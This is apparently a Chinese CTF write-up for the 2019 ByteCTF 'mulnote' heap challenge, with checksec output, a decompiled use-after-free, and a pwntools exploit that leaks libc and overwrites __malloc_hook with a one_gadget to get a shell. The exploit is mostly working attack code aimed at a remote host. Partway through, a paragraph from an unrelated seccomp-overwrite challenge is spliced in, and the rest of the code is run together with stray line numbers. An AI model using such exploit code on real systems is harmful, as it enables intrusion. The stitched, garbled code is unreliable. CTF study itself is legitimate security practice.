[TOC]

# checksec
```
[*] '/home/dra/ctf/2019_ByteCTF/mulnote/mulnote'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

# 程序流程
IDA反编译有代码混淆，仅可见
```
void *__fastcall start_routine(void *a1)
{
  free((void *)qword_202020[(_QWORD)a1]);
  sleep(0xAu);
  qword_202020[(_QWORD)a1] = 0LL;
  return 0LL;
}
```
可知存在uaf

# exp
```
from pwn import *
import time
context.log_level="debug"
def add(size,note):
    p.sendlineafter(">","C")
    p.sendlineafter(">",str(size))
    p.sendafter(">",note)
    
    
def delete(index):
    p.sendlineafter(">","R")
    p.sendlineafter(">",str(index))
    
    
def edit(index,note):
    p.sendlineafter(">","E")
    p.sendlineafter(">",str(index))
    p.sendafter(">",note)
    
    
def show():
    p.sendlineafter(">","S")

#p=process("./mulnote")
p=remote("112.126.101.",9999)
add(0x100,"kirin")
add(0x100,"kirin")


0x02 vip
程序在become_vip过程中会载⼊seccomp规则 且此函数在read name时存在溢出，可以覆盖seccomp规则 同时在edit中可以看到:
因此想到让open返回0来绕过read(fd, a1, a2)，来使edit内容可控 因此选择覆盖的seccomp规则：
判断第⼀个参数的值来控制返回操作，在open("/dev/urandom", 0);时，第⼀个参数 为"/dev/urandom"字符串地址：
delete(0)2 1 show()2 2 p.recvuntil("0]:\n")2 3 libc_addr=u64(p.recv(6)+"\x00\x00")-0x7f05f8b1cb78+0x7f05f87580002 4 print hex(libc_addr)2 5 time.sleep(10)2 6 delete(1)2 7 time.sleep(10)2 8 add(0x68,"bbbbb")2 9 add(0x68,"bbbbb")3 0 delete(0)3 1 delete(1)3 2 delete(0)3 3 add(0x68,p64(libc_addr+0x03c4b10-0x23))3 4 add(0x68,p64(libc_addr+0x03c4b10-0x23))3 5 add(0x68,p64(libc_addr+0x03c4b10-0x23))3 6 add(0x68,"a"*0x13+p64(libc_addr+0x4526a))3 7 #gdb.attach(p)3 8 p.interactive()
```
